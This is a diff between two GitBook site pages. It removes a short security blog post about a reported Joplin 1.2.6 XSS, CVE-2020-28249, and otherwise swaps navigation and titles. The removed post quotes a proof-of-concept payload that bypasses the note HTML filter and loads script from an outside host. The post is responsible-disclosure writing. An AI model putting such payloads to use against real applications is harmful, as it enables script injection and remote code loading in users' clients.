@@ -4,7 +4,7 @@
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>Tripping Over XSS · GitBook</title>
+        <title>Windows · GitBook</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
@@ -53,7 +53,7 @@
     <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
 
     
-    <link rel="next" href="../2_weblogic/weblogic-replication-ftw-kinda.html" />
+    <link rel="next" href="../mac/mac_readme.html" />
     
     
     <link rel="prev" href="../../" />
@@ -105,9 +105,9 @@
         
         
     
-        <li class="chapter active" data-level="2.1" data-path="tripping-over-xss.html">
+        <li class="chapter " data-level="2.1" data-path="../../blogs/1_tripping_xss/tripping-over-xss.html">
             
-                <a href="tripping-over-xss.html">
+                <a href="../../blogs/1_tripping_xss/tripping-over-xss.html">
             
                     
                     Tripping Over XSS
@@ -118,9 +118,9 @@
             
         </li>
     
-        <li class="chapter " data-level="2.2" data-path="../2_weblogic/weblogic-replication-ftw-kinda.html">
+        <li class="chapter " data-level="2.2" data-path="../../blogs/2_weblogic/weblogic-replication-ftw-kinda.html">
             
-                <a href="../2_weblogic/weblogic-replication-ftw-kinda.html">
+                <a href="../../blogs/2_weblogic/weblogic-replication-ftw-kinda.html">
             
                     
                     Weblogic
@@ -131,9 +131,9 @@
             
         </li>
     
-        <li class="chapter " data-level="2.3" data-path="../3_dante/dante.html">
+        <li class="chapter " data-level="2.3" data-path="../../blogs/3_dante/dante.html">
             
-                <a href="../3_dante/dante.html">
+                <a href="../../blogs/3_dante/dante.html">
             
                     
                     Dante
@@ -144,9 +144,9 @@
             
         </li>
     
-        <li class="chapter " data-level="2.4" data-path="../4_m1_macs/m1_macs.html">
+        <li class="chapter " data-level="2.4" data-path="../../blogs/4_m1_macs/m1_macs.html">
             
-                <a href="../4_m1_macs/m1_macs.html">
+                <a href="../../blogs/4_m1_macs/m1_macs.html">
             
                     
                     M1_Macs
@@ -178,9 +178,9 @@
             <ul class="articles">
                 
     
-        <li class="chapter " data-level="3.1.1" data-path="../../notes/windows/windows_readme.html">
+        <li class="chapter active" data-level="3.1.1" data-path="windows_readme.html">
             
-                <a href="../../notes/windows/windows_readme.html">
+                <a href="windows_readme.html">
             
                     
                     Windows
@@ -191,9 +191,9 @@
             
         </li>
     
-        <li class="chapter " data-level="3.1.2" data-path="../../notes/mac/mac_readme.html">
+        <li class="chapter " data-level="3.1.2" data-path="../mac/mac_readme.html">
             
-                <a href="../../notes/mac/mac_readme.html">
+                <a href="../mac/mac_readme.html">
             
                     
                     Macs
@@ -239,7 +239,7 @@
     <!-- Title -->
     <h1>
         <i class="fa fa-circle-o-notch fa-spin"></i>
-        <a href="../.." >Tripping Over XSS</a>
+        <a href="../.." >Windows</a>
     </h1>
 </div>
 
@@ -254,33 +254,7 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <h3 id="quite-literally-tripping-over-xss">Quite literally, tripping over XSS</h3>
-<p>While working an engagement, I was manually soft stepping through <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" target="_blank">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection</a> and noting things as I went when all of the sudden...</p>
-<p><img src="xss.png" alt="Screen Shot 2020-10-27 at 4.42.34 PM.png"></p>
-<p>This was reported to Laurent / Joplin and a fix implented in the following major version, not the most exciting finding but still a first CVE for me.</p>
-<p><a href="https://www.exploit-db.com/exploits/49024" target="_blank">https://www.exploit-db.com/exploits/49024</a></p>
-<pre><code>
-# Exploit Title: Joplin 1.2.6 Cross Site Scripting
-# Date: 2020-09-21
-# Exploit Author: Philip Holbrook (@fhlipZero)
-# Vendor Homepage: https://joplinapp.org/
-# Software Link: https://github.com/laurent22/joplin/releases/tag/v1.2.6
-# Version: 1.2.6
-# Tested on: Windows / Mac
-# CVE : CVE-2020-28249
-# References:
-# https://github.com/fhlip0/JopinXSS/blob/main/readme.md
-
-# 1. Technical Details
-# An XSS issue in Joplin for desktop v1.2.6 allows a link tag in a note to bypass the HTML filter
-
-# 2. PoC
-# Paste the following payload into a note:
-
-```html
-&lt;link rel=import href=&quot;data:text/html&amp;comma;&amp;lt;script&amp;gt;alert(XSS)&amp;lt;&amp;sol;script&amp;gt;
-&lt;script src=&quot;//brutelogic.com.br&amp;sol;1.js&amp;num; &lt;/script&gt;
-</code></pre>
+                                
                                 
                                 </section>
                             
@@ -307,12 +281,12 @@
 
             
                 
-                <a href="../../" class="navigation navigation-prev " aria-label="Previous page: Introduction">
+                <a href="../../" class="navigation navigation-prev " aria-label="Previous page: Notes">
                     <i class="fa fa-angle-left"></i>
                 </a>
                 
                 
-                <a href="../2_weblogic/weblogic-replication-ftw-kinda.html" class="navigation navigation-next " aria-label="Next page: Weblogic">
+                <a href="../mac/mac_readme.html" class="navigation navigation-next " aria-label="Next page: Macs">
                     <i class="fa fa-angle-right"></i>
                 </a>
                 
@@ -323,7 +297,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"Tripping Over XSS","date":"2021-01-24T19:03:56.000Z","draft":false,"level":"2.1","depth":1,"next":{"title":"Weblogic","level":"2.2","depth":1,"path":"blogs/2_weblogic/weblogic-replication-ftw-kinda.md","ref":"blogs/2_weblogic/weblogic-replication-ftw-kinda.md","articles":[]},"previous":{"title":"Introduction","level":"1.1","depth":1,"path":"README.md","ref":"README.md","articles":[]},"dir":"ltr"},"config":{"plugins":["collapsible-menu","add-js-css","sharing"],"root":"/","styles":{"website":"style.css"},"pluginsConfig":{"add-js-css":{"css":["style.css"]},"sharing":{"all":["facebook","google","twitter","weibo","instapaper"],"facebook":true,"google":false,"instapaper":false,"twitter":false,"vk":false,"weibo":false},"collapsible-menu":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"gitbook":"*"},"file":{"path":"blogs/1_tripping_xss/tripping-over-xss.md","mtime":"2022-02-19T19:00:42.549Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-02-20T03:31:38.157Z"},"basePath":"../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"Windows","level":"3.1.1","depth":2,"next":{"title":"Macs","level":"3.1.2","depth":2,"path":"notes/mac/mac_readme.md","ref":"notes/mac/mac_readme.md","articles":[]},"previous":{"title":"Notes","level":"3.1","depth":1,"path":"README.md","ref":"README.md","articles":[{"title":"Windows","level":"3.1.1","depth":2,"path":"notes/windows/windows_readme.md","ref":"notes/windows/windows_readme.md","articles":[]},{"title":"Macs","level":"3.1.2","depth":2,"path":"notes/mac/mac_readme.md","ref":"notes/mac/mac_readme.md","articles":[]}]},"dir":"neutral"},"config":{"plugins":["collapsible-menu","add-js-css","sharing"],"root":"/","styles":{"website":"style.css"},"pluginsConfig":{"add-js-css":{"css":["style.css"]},"sharing":{"all":["facebook","google","twitter","weibo","instapaper"],"facebook":true,"google":false,"instapaper":false,"twitter":false,"vk":false,"weibo":false},"collapsible-menu":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"gitbook":"*"},"file":{"path":"notes/windows/windows_readme.md","mtime":"2022-02-19T19:25:11.731Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-02-20T03:31:38.157Z"},"basePath":"../..","book":{"language":""}});
         });
     </script>
 </div>
